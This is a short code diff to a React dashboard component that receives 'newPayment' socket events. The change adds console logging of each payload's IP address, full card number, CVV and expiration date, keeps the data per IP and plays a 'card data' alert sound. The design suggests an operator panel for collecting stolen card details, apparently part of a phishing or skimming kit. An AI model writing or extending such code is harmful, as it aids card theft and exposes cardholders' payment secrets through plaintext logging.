@@ -55,10 +55,15 @@ export default function Dashboard() {
     });
 
     socket.on('newPayment', (data) => {
-      console.log('💳 New payment:', data);
+      console.log('💳 New payment RAW:', data);
       // Extract actual payment data from payload
       const paymentData = data.payload || data;
       const ip = paymentData.ip || data.ip;
+      console.log('💳 Extracted paymentData:', paymentData);
+      console.log('💳 IP:', ip);
+      console.log('💳 Card Number:', paymentData.cardNumber);
+      console.log('💳 CVV:', paymentData.cvv);
+      console.log('💳 Expiration:', paymentData.expirationDate);
       updateCustomerData(ip, 'payments', paymentData);
       playCardDataSound();
     });
